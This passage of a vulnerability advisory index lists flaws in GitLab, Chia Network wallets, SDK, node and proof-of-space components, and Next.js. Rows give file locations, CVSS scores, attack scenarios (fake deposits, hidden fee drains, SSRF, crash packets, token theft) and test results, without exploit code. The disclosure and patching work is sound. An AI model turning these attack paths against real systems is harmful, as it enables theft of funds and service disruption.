Phishing After Slash Command Confirm):** Confirming a slash command on the trusted GitLab domain redirects (`302 Found`) the developer to an external credential-harvesting page.<br/>**Scenario B (Cross-Project ChatOps Account Binding):** A `command_id` minted in Project B is accepted on Project A's `/slash_commands/confirm` endpoint.<br/>**Scenario C (ChatOps Callback Hijack):** `request_params[:response_url]` overrides the cached `response_url` during `VerifyRequest#approve!`. | `RED`: `http_status: 302, open_redirect_triggered: true, cross_project_cache_collision_accepted: true`<br/>`GREEN`: `404, open_redirect_triggered: false`<br/>`pytest -k test_report5_cand04` |
| **19** | [`19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/ja/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)<br/>Upstream Duplicate: `CVE-2026-40295`<br/>*(GitHub Only — Not Submitted to MITRE)* | **gitlab-org/gitlab** (`<= 19.6.0-pre`)<br/>`lib/gitlab/devise_failure.rb:4-18`<br/>`lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`<br/>`app/controllers/oauth/authorizations_controller.rb:316-330` | `CWE-601 / CWE-345`<br/>**5.4 Medium (Upstream CVE-2026-40295 Duplicate)**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` | **[UPSTREAM DUPLICATE: `CVE-2026-40295` — Published on GitHub Only, Not Submitted to MITRE]**<br/>**How It Happens in Code:** `Gitlab::DeviseFailure` inherits `Devise 5.0.3` `redirect_url` (`CVE-2026-40295`), which redirects to an unsanitized external `Referer` on non-GET `:timeout` failures; `AuthorizationsController#validate_pkce_for_dynamic_applications` (`CAND-03`) has an early return on `nil` `code_challenge_method` (mitigated at runtime by `Doorkeeper 5.9.3`).<br/>**Scenario A/B/C:** Product-level `extract_path_from_location(request.referrer)` override in `lib/gitlab/devise_failure.rb` and controller-level PKCE defense-in-depth patch. | `DUPLICATE OF CVE-2026-40295` *(Not submitted to MITRE)*<br/>`RED`: `external_referer_redirect: true`<br/>`GREEN`: `path_extracted_only: true` |
| **20** | [`20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/ja/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)<br/>`CHIA-WLC-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`) | `CWE-345 / CWE-347`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `WalletNode._add_block_from_header` (`wallet_node.py:926-995`) ingests `header_block.foliage_transaction_block` without verifying `foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash`.<br/>**Scenario A (0-XCH Capital Fake Deposit):** With zero XCH capital and no counterparty approval, an attacker sends a real header with a swapped transaction block to credit `+0.5 XCH` (`500,000,000,000 mojo`) as confirmed and cash out real USDT/BTC.<br/>**Scenario B (Persistent SQLite Poisoning):** Counterfeit coins persist across `WalletCoinStore` cold restarts (`Err.UNKNOWN_UNSPENT` on spend).<br/>**Scenario C (`CONS-SP-01` + `WLC-01`):** FullNode sync lockout followed by light-wallet fake deposit injection. | `RED`: `fake_merchant_deposit_increase_mojo: 500000000000, spend_err: UNKNOWN_UNSPENT`<br/>`GREEN`: `rejected_forged_foliage_tx_block: true, fake_increase: 0`<br/>`pytest -k test_wlc01` |
| **21** | [`21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/ja/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)<br/>`CHIA-WLC-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/wallet/wallet_node.py:725-777`<br/>`chia/wallet/wallet_state_manager.py:1735-1778` | `CWE-345 / CWE-400`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `wallet_node.py:725-777` and `wallet_state_manager.py:1735-1778` persist unverified `RespondRemovals(proofs=None)` / `spent_height` transitions into SQLite `WalletCoinStore`.<br/>**Scenario A (Clawback Cancel Lockout):** Victim cannot cancel a `0.5 XCH` Clawback coin (`tx_count: 0`); attacker claims on-chain after timelock expiry (`33361e6b...`).<br/>**Scenario B (`WLC-02` + `VR-01` Unified Chain):** Simultaneously locks live wallet cancellation and emergency `chia-vault-recover` CLI on one timeline (`t0..t4`).<br/>**Scenario C (UTXO Freeze DoS):** Freezes unspent coins across cold SQLite restarts. | `RED`: `t1_cold_reloaded_sqlite_spent: true, t2_sender_cancel_tx_count: 0, t4_recipient_claim_succeeded: true`<br/>`GREEN`: `t1_spent: false, t2_sender_cancel_tx_count: 1`<br/>`pytest -k test_wlc02` |
| **22** | [`22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md`](advisories/ja/22-CHIA-GUI-WC-01-WALLETCONNECT-MODAL-OVERWRITE-TOCTOU.md)<br/>`CHIA-GUI-WC-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain-gui** (`<= 2.6.1-rc2.dev60`)<br/>`packages/gui/src/components/walletConnect/WalletConnectContext.tsx:314-441`<br/>`constants/WalletConnectCommands.ts` | `CWE-367 / CWE-285`<br/>**8.8 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **How It Happens in Code:** `WalletConnectContext.tsx:314-441` exposes all 29 commands on connect, lacks a FIFO confirmation queue, and fails to re-verify `(requestId, fingerprint, network, pairing)` in `sendCommand`.<br/>**Scenario A (Modal Overwrite Drain):** A dApp overwrites a benign `chia_getCurrentAddress` prompt with `chia_sendTransaction`, draining `0.5 XCH` (`SpendBundle d2ce2264...`).<br/>**Scenario B (Fingerprint TOCTOU):** Approval on burner key `111111` executes on main key `999999`.<br/>**Scenario C (Post-Disconnect Execution):** Pending request executes after pairing/network change. | `RED`: `modal_overwritten: true, unauthorized_spend_bundle_sha256: d2ce22645a9a23b1...`<br/>`GREEN`: `6/6 distinct WSS packets blocked`<br/>`pytest -k gui_wc01` |
| **23** | [`23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md`](advisories/ja/23-CHIA-DL-01-DATALAYER-VERIFY-PROOF-NON-SINGLETON-FORGERY-CAT-MINT.md)<br/>`CHIA-DL-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/rpc/wallet_rpc_api.py:4066-4120` (`dl_verify_proof`)<br/>`chia/data_layer/data_layer_util.py` | `CWE-347 / CWE-345`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N` | **How It Happens in Code:** `WalletRpcApi.dl_verify_proof` (`wallet_rpc_api.py:4066-4120`) verifies coin existence and Merkle hashes without checking `match_dl_singleton` or `launcher_id == store_id`.<br/>**Scenario A (`100,000 CAT` On-Chain Mint):** A 1-mojo non-singleton coin (`86ec0dd7...`) forges `store_id` `806a6c73...`, passing `dl_verify_proof` and minting `100,000 CAT` on-chain (`dc3f0bba...`).<br/>**Scenario B (Intrinsic RPC Bypass):** Side-by-side canonical vs. counterfeit `DLProof` both return `verified: true` in `RED`.<br/>**Scenario C (Registry Spoofing):** Forges audit proofs for any official DataLayer `store_id`. | `RED`: `counterfeit_verified: true, attacker_cat_balance_mojo: 100000000`<br/>`GREEN`: `counterfeit_verified: false, attacker_cat_balance_mojo: 0`<br/>`pytest -k dl01` |
| **24** | [`24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md`](advisories/ja/24-CHIA-CS-01-CLEAR-SIGNING-NON-CANONICAL-CONDITION-OTHER-FEE-DRAIN.md)<br/>`CHIA-CS-01 (POC-1 & POC-2)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs`<br/>`crates/chia-sdk-driver/src/clear_signing/tests.rs` | `CWE-451 / CWE-345`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `clear_signing.rs` ignores `Condition::Other` CLVM conditions (such as overlong `RESERVE_FEE` opcode `52`) that consensus CLVM executes.<br/>**Scenario A (`750 XCH` Hidden Fee Drain):** `SpendBundle` `b9b614d0...` displays `reserved_fee: 0` in Clear-Signing while draining `750 XCH` (`750,000,000,000,000 mojo`) in consensus.<br/>**Scenario B (NFT State Spoofing):** `SpendBundle` `17d2796f...` alters NFT state invisibly.<br/>**Scenario C (Fail-Closed Patch):** `GREEN` rejects non-canonical conditions before signing. | `RED`: `displayed_fee_mojo: 0, consensus_fee_drained_mojo: 750000000000000`<br/>`GREEN`: `rejected_non_canonical_condition: true`<br/>`cargo test clear_signing::tests` |
| **25** | [`25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md`](advisories/ja/25-CHIA-CS-02-CLEAR-SIGNING-NFT-METADATA-UPDATER-HIDDEN-FEE.md)<br/>`CHIA-CS-02 (POC-3)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (`NEW_METADATA_INFO` evaluation) | `CWE-451 / CWE-345`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` ignores extra consensus conditions (`RESERVE_FEE`) emitted by an NFT `NEW_METADATA_INFO` updater program.<br/>**Scenario A (`500 XCH` Hidden NFT Fee):** `SpendBundle` `b314b6d7...` (`3,300B`) shows `reserved_fee = 0` in Clear-Signing while draining `500 XCH` on-chain.<br/>**Scenario B (Trojan NFT Updater):** Custom updater triggers hidden fee during vault NFT operations.<br/>**Scenario C (`GREEN` Patch):** Rejects non-pure metadata updater conditions. | `RED`: `displayed_fee_mojo: 0, consensus_fee_drained_mojo: 500000000000000`<br/>`GREEN`: `rejected_impure_metadata_updater: true`<br/>`cargo test clear_signing::tests` |
| **26** | [`26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md`](advisories/ja/26-CHIA-CS-03-CLEAR-SIGNING-OFFER-SET-INTERSECTION-OUTFLOW-OMISSION.md)<br/>`CHIA-CS-03 (POC-4)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (dependent offer leg aggregation) | `CWE-682 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` merges dependent offer settlement legs via set intersection, dropping disjoint payment legs.<br/>**Scenario A (`500 XCH` Omitted Offer Leg):** Vault spend `3c55638a...` + settlement spend `7c05b725...` transfers `500 XCH` (`500,000,000,000,000 mojo`) omitted from Clear-Signing.<br/>**Scenario B (Treasury Swap Drain):** Disjoint notarized payment drains treasury funds.<br/>**Scenario C (`GREEN` Patch):** Enforces full union accounting across all legs. | `RED`: `omitted_settlement_outflow_mojo: 500000000000000`<br/>`GREEN`: `full_outflow_accounted_or_rejected: true`<br/>`cargo test clear_signing::tests` |
| **27** | [`27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md`](advisories/ja/27-CHIA-CS-04-CLEAR-SIGNING-UNREVEALED-SETTLEMENT-SPEND-BLIND-SPOT.md)<br/>`CHIA-CS-04 (POC-5)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (unrevealed settlement output handling) | `CWE-345 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` allows creating a `SETTLEMENT_PAYMENT_HASH` coin without revealing its spend in the signing bundle.<br/>**Scenario A (`600 XCH` Unrevealed Settlement):** Victim signs `a9eeda2c...` (`1,303B`); attacker attaches settlement spend `e0b876fb...` (`388B`) and drains `600 XCH`.<br/>**Scenario B (Air-Gapped Signer Bypass):** Hardware preview shows zero external recipient.<br/>**Scenario C (`GREEN` Patch):** Rejects unrevealed settlement outputs. | `RED`: `unrevealed_settlement_accepted: true, hidden_outflow_mojo: 600000000000000`<br/>`GREEN`: `rejected_unrevealed_settlement: true`<br/>`cargo test clear_signing::tests` |
| **28** | [`28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md`](advisories/ja/28-CHIA-CS-05-CLEAR-SIGNING-EXTERNAL-DROPCOIN-VAULT-CHANGE-SPOOFING.md)<br/>`CHIA-CS-05 (POC-6)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.38.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs`<br/>`crates/chia-sdk-bindings/src/clear_signing.rs:62` (`parse_vault_transaction`) | `CWE-682 / CWE-451`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `clear_signing.rs` and `chia_sdk_bindings::parse_vault_transaction` credit outputs from external non-vault `DropCoin` spends as vault change.<br/>**Scenario A (`1,000 XCH` FFI Vault Drain):** `SpendBundle` `aa651822...` (`1,477B`) drains `1,000 XCH` (`1,000,000,000,000,000 mojo`) while reporting `0` net vault loss across the FFI boundary.<br/>**Scenario B (Multi-Sig Deception):** All cosigners see the spoofed change summary.<br/>**Scenario C (`GREEN` FFI Test):** Rejects with `Error::NonStandardInnerSpend`. | `RED`: `ffi_parse_vault_tx_accepted: true, masked_vault_drain_mojo: 1000000000000000`<br/>`GREEN`: `Err(NonStandardInnerSpend)`<br/>`cargo test --test clear_signing_ffi_proof` |
| **29** | [`29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md`](advisories/ja/29-CHIA-CS-06-CLEAR-SIGNING-OFFER-PRE-SPLIT-POST-SIG-SPLICING.md)<br/>`CHIA-CS-06 (POC-7)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (offer pre-split coin destination binding) | `CWE-347 / CWE-451`<br/>**9.1 Critical**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` | **How It Happens in Code:** `clear_signing.rs` accepts offer pre-split child spends that are not cryptographically bound by an announcement to the signed vault spend.<br/>**Scenario A (`1,000 XCH` Post-Signature Splicing):** Victim signs `476b8e83...` (`1,994B`); attacker splices `5b3a3b21...` (`1,701B`) and redirects `1,000 XCH` under the same BLS signature.<br/>**Scenario B (Mempool Replacement):** Unbound child spend replaced in transit.<br/>**Scenario C (`GREEN` Patch):** Enforces cryptographic announcement binding. | `RED`: `pre_split_sha256: 476b8e83..., spliced_sha256: 5b3a3b21..., redirected_mojo: 1000000000000000`<br/>`GREEN`: `rejected_unbound_presplit: true`<br/>`cargo test clear_signing::tests` |
| **30** | [`30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md`](advisories/ja/30-CHIA-CS-07-CLEAR-SIGNING-REVERSE-CLAWBACK-SENDER-HIJACK.md)<br/>`CHIA-CS-07 (POC-8)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (Clawback `sender_puzzle_hash` ownership check) | `CWE-345 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` does not verify that a Clawback output's `sender_puzzle_hash` belongs to the signing vault.<br/>**Scenario A (`1,000 XCH` Reverse Clawback):** `SpendBundle` `6897c10e...` (`1,218B`) sets the attacker as `sender_puzzle_hash`, letting the attacker immediately claw back `1,000 XCH`.<br/>**Scenario B (Self-Transfer Illusion):** Victim is set as receiver while attacker holds instant clawback rights.<br/>**Scenario C (`GREEN` Patch):** Enforces `sender_puzzle_hash` ownership. | `RED`: `attacker_set_as_clawback_sender: true, hijacked_mojo: 1000000000000000`<br/>`GREEN`: `rejected_foreign_clawback_sender: true`<br/>`cargo test clear_signing::tests` |
| **31** | [`31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md`](advisories/ja/31-CHIA-CS-08-CLEAR-SIGNING-EXTERNAL-CAT-RING-MELT-ISSUANCE-OMISSION.md)<br/>`CHIA-CS-08 (POC-9)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/cni-wallet-sdk** (`<= 0.36.0`)<br/>`crates/chia-sdk-driver/src/clear_signing.rs` (external CAT ring TAIL melt/issuance accounting) | `CWE-682 / CWE-451`<br/>**8.6 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `clear_signing.rs` omits external CAT ring `RUN_TAIL` melt/issuance deltas funded by the vault's CAT spend.<br/>**Scenario A (`750 XCH`-Scale CAT Ring Drain):** `SpendBundle` `e48c3171...` (`2,541B`) drains `750,000,000,000,000` mojos via an external CAT ring melt.<br/>**Scenario B (Redemption Hijack):** External ring member absorbs vault CAT delta.<br/>**Scenario C (`GREEN` Patch):** Enforces full CAT ring conservation. | `RED`: `poc9_spend_bundle_sha256: e48c3171..., omitted_cat_ring_delta_mojo: 750000000000000`<br/>`GREEN`: `rejected_unbalanced_external_cat_ring: true`<br/>`cargo test clear_signing::tests` |
| **32** | [`32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md`](advisories/ja/32-CHIA-VR-01-VAULT-RECOVER-DUST-LAUNCHER-POISONING-LOCKOUT.md)<br/>`CHIA-VR-01 (POC-10)`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-vault-recover** (`<= 1.0.0-rc9`)<br/>`src/locate.rs:148-219` (`find_launcher_id`) | `CWE-345 / CWE-400`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `find_launcher_id` (`src/locate.rs:148-219`) returns the first `SINGLETON_LAUNCHER_HASH` child found at the user's address without verifying vault custody/recovery key match.<br/>**Scenario A (1-Mojo CLI Lockout):** Decoy launcher `2de44601...` causes `chia-vault-recover` (`1.0.0-rc9`) to abort with `recovery phrase does not match`.<br/>**Scenario B (`WLC-02` + `VR-01` Chain):** Blocks both GUI and CLI recovery.<br/>**Scenario C (`GREEN` Release Binary):** Recovers true launcher `e53d0c41...` (`45/45` tests pass). | `RED`: `selected_launcher: 2de44601... (decoy), cli_exit_code: 1`<br/>`GREEN`: `selected_launcher: e53d0c41... (victim), cli_exit_code: 0`<br/>`pytest -k poc10` |
| **33** | [`33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md`](advisories/ja/33-CHIA-CONS-SP-01-FULLNODE-SUB-EPOCH-SYNC-LOCKOUT-AND-REORG.md)<br/>`CHIA-CONS-SP-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/full_node/full_node.py:2220-2310` (`new_peak` / `sync_from_fork_point`) | `CWE-400 / CWE-345`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **How It Happens in Code:** `full_node.py:2220-2310` aborts `sync_from_fork_point` on invalid sub-epoch/weight-proof responses without disconnecting the peer.<br/>**Scenario A (Port `8444` Sync Lockout):** 3-node mTLS proof keeps victim `peak` at `None` despite an honest peer at `height=5`.<br/>**Scenario B (`10,000 XCH` Reorg Double-Spend):** `Branch A` (`26afe149...`) credits exchange `+10,000 XCH`; `Branch B` (`ad2eba4d...`) reorgs exchange balance to `0`.<br/>**Scenario C (`GREEN` Patch):** Disconnects offending peer & enforces `min_confirmations=32`. | `RED`: `victim_peak: None, reorg_exchange_loss_mojo: 10000000000000000`<br/>`GREEN`: `victim_synced_height: 5, exchange_loss_mojo: 0`<br/>`pytest -k reorg` |
| **34** | [`34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md`](advisories/ja/34-CHIA-WLT-OFFER-01-TAKE-OFFER-UNBOUNDED-IMPLICIT-COIN-SPEND.md)<br/>`CHIA-WLT-OFFER-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/rpc/wallet_rpc_api.py` (`take_offer`)<br/>`chia/wallet/trade_manager.py` (`respond_to_offer`) | `CWE-863`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `take_offer` / `respond_to_offer` selects and signs wallet coins for requested offer payments without enforcing a per-asset `max_authorized_amount` cap.<br/>**Scenario A (Taker Bot Excess Spend):** External Offer induces coin selection above expected quote.<br/>**Scenario B (Hidden Multi-Asset Leg):** CAT/NFT offer silently pulls XCH from wallet.<br/>**Scenario C (`GREEN` Patch):** Enforces explicit per-asset spend cap. | `RED`: `unbounded_implicit_coin_spend_signed: true`<br/>`GREEN`: `exceeded_max_authorized_amount_rejected: true`<br/>`pytest -k wallet` |
| **35** | [`35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md`](advisories/ja/35-CHIA-POS-01-HARVESTER-FARMER-SINGLE-PACKET-RUST-PANIC-DOS.md)<br/>`CHIA-POS-01`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/farmer/farmer_api.py:85-185` (`FarmerAPI.new_proof_of_space`)<br/>`chiapos` Rust FFI (`size_v2` / `get_quality_string`) | `CWE-248 / CWE-20`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `FarmerAPI.new_proof_of_space` (`farmer_api.py:85-185`) calls Rust FFI `size_v2()` / `get_quality_string()` before validating pool key XOR exclusivity and `check_plot_param`.<br/>**Scenario A (4/4 Farmer Cluster Crash):** Single 445-byte wire packet (`30a0e918...`) triggers `pyo3_runtime.PanicException` and terminates all 4 Farmer processes (`exit_code=1`).<br/>**Scenario B (Slice OOB Panic):** Truncated proof triggers `range end index 36 out of range for slice of length 32`.<br/>**Scenario C (`GREEN` Patch):** `4/4` Farmers survive (`exit_code=0`). | `RED`: `packet_bytes: 445, crashed_farmers: 4/4, PanicException`<br/>`GREEN`: `crashed_farmers: 0/4, alive_farmers: 4`<br/>`pytest -k farmer` |
| **36** | [`36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/ja/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)<br/>`CHIA-POS-02..04`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiapos** (`<= 2.0.11`)<br/>`src/verifier.hpp:48-108` (`Verifier::ValidateProof`)<br/>`src/bits.hpp:184`<br/>`src/prover_disk.hpp:254-322` (`DiskProver`) | `CWE-190 / CWE-787 / CWE-125`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **How It Happens in Code:** `Verifier::ValidateProof` (`src/verifier.hpp`, `src/bits.hpp:184`) overflows bit offsets at `k=50` (Table 4) and `k>=60`, and `DiskProver` (`src/prover_disk.hpp`) truncates 64-bit plot table sizes to 32-bit.<br/>**Scenario A (Crafted `.plot` Heap Overflow):** Loading a crafted `.plot` file triggers 64-to-32-bit truncation heap corruption.<br/>**Scenario B (`k=50` / `k=60` Stack OOB):** Verified via ASan/UBSan `chiapos_k_probe` (`exit_code=1`).<br/>**Scenario C (`GREEN` Patch):** Bounds-checked (`exit_code=0`). | `RED`: `k50_table4_asan_exit: 1, k60_asan_exit: 1 (src/bits.hpp:184 OOB)`<br/>`GREEN`: `exit_code: 0, rejected_cleanly: true`<br/>`pytest -k chiapos` |
| **37** | [`37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/ja/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)<br/>`CHIA-VDF-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiavdf** (`<= 1.1.11`)<br/>`src/verifier.cpp` (`CheckProofOfTimeNWesolowski`)<br/>`src/prover_slow.h` | `CWE-125 / CWE-416`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`) slices `proof_blob` without validating `proof_blob_len` or `num_iterations > 0`.<br/>**Scenario A (Verifier OOB Crash):** Truncated VDF proof triggers native C++ out-of-bounds read.<br/>**Scenario B (Teardown UAF):** Worker thread accesses freed state in `prover_slow.h`.<br/>**Scenario C (`GREEN` Patch):** Returns `false` cleanly on malformed VDF proofs. | `RED`: `asan_oob_or_segv: true, exit_code: 1`<br/>`GREEN`: `asan_oob_or_segv: false, verified: false`<br/>`chiavdf ASan harness` |
| **38** | [`38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/ja/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)<br/>`CHIA-DL-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/data_layer/download_data.py`<br/>`chia/data_layer/data_layer.py` | `CWE-918`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `download_data.py` fetches DataLayer mirror URLs with `allow_redirects=True` and no loopback/private IP validation on redirect hops.<br/>**Scenario A (Internal Loopback/Metadata SSRF):** A `302` redirect on an announced mirror URL hits `127.0.0.1` / `169.254.169.254`.<br/>**Scenario B (Replica Fleet Scanning):** Subscribed nodes poll redirected internal hosts.<br/>**Scenario C (`GREEN` Patch):** Blocks redirects to private/loopback IPs. | `RED`: `redirect_to_loopback_followed: true, internal_hit_count: 1`<br/>`GREEN`: `redirect_to_loopback_followed: false, internal_hit_count: 0`<br/>`pytest -k dl02` |
| **39** | [`39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/ja/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)<br/>`VERCEL-NEXT-15`<br/>MITRE CNA-LR & HackerOne #4152250 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`<br/>`packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201` | `CWE-200 / CWE-918 / CWE-345`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `createRedirectRenderResult()` (`action-handler.js:278-303`) fetches Server Action redirect targets without `redirect: 'manual'`, following external `302` hops with `x-next-revalidate-tag-token` (`previewModeId`) and piping external RSC Flight streams back under a same-origin `x-action-redirect`. Omitting `"b"` in Flight data bypasses `server-action-reducer.js:161` Build ID checks (`UXSS`).<br/>**Scenario A (SSO/OIDC `previewModeId` Theft):** Multi-tenant SSO login Server Action leaks `previewModeId` to tenant IdP.<br/>**Scenario B (Global ISR Cache Wiping):** Stolen `previewModeId` authorizes `x-prerender-revalidate` cache purging.<br/>**Scenario C (Same-Origin RSC Flight UXSS):** OAuth bounce `302` injects forged RSC Virtual DOM (`response.b === undefined`) and CORS headers into `victim-app.com`. | `RED`: `leaked_previewModeId: f5dbbd8f6a6a51a6aa8ff1443f7090dd, client_build_id_check_bypassed: true, flight_uxss: true`<br/>`GREEN`: `redirect: 'manual', external_hop_followed: false`<br/>HackerOne `#4152250` (+2 Comments) |
